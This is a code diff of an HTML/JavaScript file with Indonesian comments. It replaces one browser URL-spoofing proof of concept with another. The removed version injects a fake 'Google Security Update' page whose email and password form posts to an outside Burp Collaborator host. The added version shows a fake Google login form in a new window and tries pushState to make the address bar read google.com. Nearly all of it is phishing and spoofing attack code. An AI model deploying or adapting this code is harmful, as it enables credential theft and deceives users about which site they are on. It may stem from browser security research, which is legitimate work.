@@ -1,48 +1,26 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <button onclick="spoof()">Click to spoof</button>
-
-    <script>
-      function spoof() {
-        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/csi", "_blank");
-
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Google Security Verification</title>
-</head>
-<body>
-  <h1>Google Security Update Required</h1>
-  <p>Please verify your identity to continue</p>
+<script>
+function spoof() {
+  // Pakai data URL sebagai intermediate
+  let win = window.open("data:text/html,<h1>Loading Google...</h1>", "_blank");
   
-  <form action="https://burpcollaborator.oastify.com" method="POST">
-    <label for="u">Email:</label><br>
-    <input type="text" id="u" name="u" required><br><br>
-    
-    <label for="p">Password:</label><br>
-    <input type="password" id="p" name="p" required><br><br>
-    
-    <input type="submit" value="Verify Identity">
-  </form>
-  
-  <p style="color: #666; font-size: 12px; margin-top: 20px;">
-    This verification is required to protect your account from unauthorized access.
-  </p>
-</body>
-</html>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
-    </script>
-  </body>
-</html>
+  setTimeout(() => {
+    try {
+      // Ganti content
+      win.document.body.innerHTML = `
+        <h1>Google Login</h1>
+        <form>
+          <input type="text" placeholder="Email">
+          <input type="password" placeholder="Password">
+          <button>Sign In</button>
+        </form>
+      `;
+      
+      // Coba update URL (mungkin gagal, tapi worth try)
+      win.history.pushState({}, "", "https://www.google.com/");
+      
+    } catch(e) {
+      console.log("Alternative approach blocked");
+    }
+  }, 100);
+}
+</script>
